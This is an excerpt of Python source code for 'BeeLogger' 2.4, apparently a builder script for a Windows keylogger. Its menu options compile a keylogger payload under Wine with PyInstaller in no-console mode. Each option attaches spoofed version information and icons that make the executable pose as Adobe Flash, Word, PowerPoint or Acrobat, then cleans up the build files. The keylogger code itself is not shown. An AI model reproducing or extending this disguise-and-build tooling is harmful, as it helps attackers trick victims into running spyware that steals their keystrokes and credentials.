...
(     /   /  )%%%%%%%(  \   \     )
(___/___/__/           \__\___\___)     https://github.com/ali-shokoohi/BeeLogger
   (     /  / (%%%%%%) \  \     ) 
    (__/___/   (%%%%)  \___\__)                 
...
def heading():
    ...
    sys.stdout.write(YELLOW + '''
       ...
       .        .   .          \(__\_/             Version: 2.4
        .         .         . -{{#(|8)
          ' .  . ' ' .  . '    /(__/ \     Improved by:''' + WHITE + ' Ali Shokoohi (' + YELLOW + 'ali-shokoohi' + WHITE + ')' + '\n' + '\n' + END) 
...
def main():
    ...
    try:
		...
		pp()
            ...
            if choice.upper() == '6':
                begin()
                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconfirm --noconsole -m $HOME/BeeLogger/Manifest/manifest.manifest -F k.py')
                os.system('rm -Rf build k.spec k.py')
                name = 'Bee.exe'
                os.rename('dist/k.exe', 'dist/' + name)
                clear()
                heading()
                os.system('rm -Rf $HOME/BeeLogger/Templates/k_enc.py')
                print '\n {0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
            if choice == '1':
                begin()
                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m $HOME/BeeLogger/Manifest/manifest.manifest --version-file=$HOME/BeeLogger/Resource/adobe.Bee -i $HOME/BeeLogger/Icons/flash.ico -F k.py')
                os.system('rm -Rf build k.spec k.py')
                name = 'Bee_Flash_.exe'
                os.rename('dist/k.exe', 'dist/' + name)
                clear()
                ...
                begin()
                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m $HOME/BeeLogger/Manifest/manifest.manifest --version-file=$HOME/BeeLogger/Resource/word.Bee -i $HOME/BeeLogger/Icons/word.ico -F k.py')
                os.system('rm -Rf build k.spec k.py')
                ...
                begin()
                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m $HOME/BeeLogger/Manifest/manifest.manifest --version-file=$HOME/BeeLogger/Resource/powerpoint.Bee -i $HOME/BeeLogger/Icons/powerpoint.ico -F k.py')
                os.system('rm -Rf build k.spec k.py')
                ...
                begin()
                os.system('wine $HOME/.wine/drive_c/Python27/python.exe $HOME/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m $HOME/BeeLogger/Manifest/manifest.manifest --version-file=$HOME/BeeLogger/Resource/acrobat.Bee -i $HOME/BeeLogger/Icons/acrobat.ico -F k.py')
                os.system('rm -Rf build k.spec k.py')
